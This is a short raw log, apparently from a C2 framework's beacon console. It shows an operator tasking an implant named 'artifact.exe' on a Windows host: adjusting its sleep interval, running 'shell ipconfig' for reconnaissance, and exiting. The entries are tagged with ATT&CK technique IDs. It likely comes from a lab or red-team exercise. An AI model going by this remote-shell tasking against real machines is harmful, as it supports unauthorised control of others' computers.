10/21 09:49:24 UTC [metadata] 172.16.56.139 <- 169.254.198.49; computer: READER-L-PC; user: reader-l; process: artifact.exe; pid: 1248; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
10/21 09:51:48 UTC [input] <reader-l> sleep 1
10/21 09:51:48 UTC [task] <T1029> Tasked beacon to sleep for 1s
10/21 09:53:24 UTC [metadata] 172.16.56.139 <- 169.254.198.49; computer: READER-L-PC; user: reader-l; process: artifact.exe; pid: 1248; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
10/21 09:53:20 UTC [checkin] host called home, sent: 24 bytes
10/21 09:53:20 UTC [output]
beacon exit.

10/21 09:53:47 UTC [input] <reader-l> sleep 0
10/21 09:53:47 UTC [task] <T1029> Tasked beacon to become interactive
10/21 09:53:48 UTC [input] <reader-l> 
10/21 09:53:48 UTC [error] Unknown command: 
10/21 09:53:48 UTC [input] <reader-l> 
10/21 09:53:48 UTC [error] Unknown command: 
10/21 09:53:49 UTC [input] <reader-l> 
10/21 09:53:49 UTC [error] Unknown command: 
10/21 09:53:52 UTC [input] <reader-l> shell ipcnfig
10/21 09:53:53 UTC [task] <T1059> Tasked beacon to run: ipcnfig
10/21 09:53:57 UTC [input] <reader-l> shell ipconfig
10/21 09:53:57 UTC [task] <T1059> Tasked beacon to run: ipconfig
10/21 09:54:11 UTC [input] <reader-l> exit
10/21 09:54:11 UTC [task] <> Tasked beacon to exit
